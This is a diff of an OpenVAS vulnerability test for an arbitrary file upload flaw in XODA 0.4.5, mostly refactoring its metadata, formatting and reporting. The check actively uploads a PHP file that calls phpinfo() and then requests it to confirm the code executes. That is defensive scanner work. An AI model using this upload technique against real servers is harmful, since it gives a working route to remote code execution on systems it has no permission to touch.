@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_xoda_55127.nasl 3062 2016-04-14 11:03:39Z benallard $
+# $Id: gb_xoda_55127.nasl 5715 2017-03-24 11:34:41Z cfi $
 #
 # XODA Arbitrary File Upload and HTML Injection Vulnerabilities
 #
@@ -35,26 +35,19 @@ execute arbitrary code on the server.
 
 XODA 0.4.5 is vulnerable; other versions may also be affected.";
 
-
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103548";
-
 if (description)
 {
- script_oid(SCRIPT_OID);
+ script_oid("1.3.6.1.4.1.25623.1.0.103548");
  script_bugtraq_id(55127);
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:P");
- script_version ("$Revision: 3062 $");
-
+ script_version ("$Revision: 5715 $");
  script_name("XODA Arbitrary File Upload and HTML Injection Vulnerabilities");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/55127");
-
- script_tag(name:"last_modification", value:"$Date: 2016-04-14 13:03:39 +0200 (Thu, 14 Apr 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 12:34:41 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-08-22 11:33:41 +0200 (Wed, 22 Aug 2012)");
- script_summary("Determine if it is possible to upload a file");
  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -65,30 +58,26 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!can_host_php(port:port))exit(0);
+foreach dir( make_list_unique( "/xoda", cgi_dirs( port:port ) ) ) {
 
-dirs = make_list("/xoda",cgi_dirs());
-
-foreach dir (dirs) {
-   
+  if( dir == "/" ) dir = "";
   url = dir + '/?upload_to='; 
 
-  if(http_vuln_check(port:port, url:url,pattern:"<h4>Upload a file")) {
+  if( http_vuln_check( port:port, url:url, pattern:"<h4>Upload a file" ) ) {
 
-    host = get_host_name();
+    host = http_host_name( port:port );
     file = "openvas_" + rand() + ".php";
     ex = "<?php phpinfo(); ?>";
     len = 361 + strlen(file);
 
     req = string("POST ",dir,"/?upload HTTP/1.1\r\n",
                  "Host: ",host,"\r\n",
-                 "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:13.0) Gecko/20100101 OpenVAS/13.0\r\n",
+                 "User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                  "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
                  "DNT: 1\r\n",
@@ -108,22 +97,21 @@ foreach dir (dirs) {
                  "\r\n",
                  "\r\n", 
                  "-----------------------------161664008613401129571781664881--\r\n"); 
+    res = http_keepalive_send_recv( data:req, port:port );
 
-    result = http_send_recv(data:req, port:port);
-
-    if("Location:" >< result) {
+    if( "Location:" >< res ) {
 
       url = dir + '/files/' + file;
-      req = http_get(item:url, port:port);
-      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
+      req = http_get( item:url, port:port );
+      buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-      if("<title>phpinfo()" >< buf) {
-        security_message(port:port);
-        exit(0);
+      if( "<title>phpinfo()" >< buf ) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
       }
-
-    } 
+    }
   }
 }
 
-exit(0);
+exit( 99 );
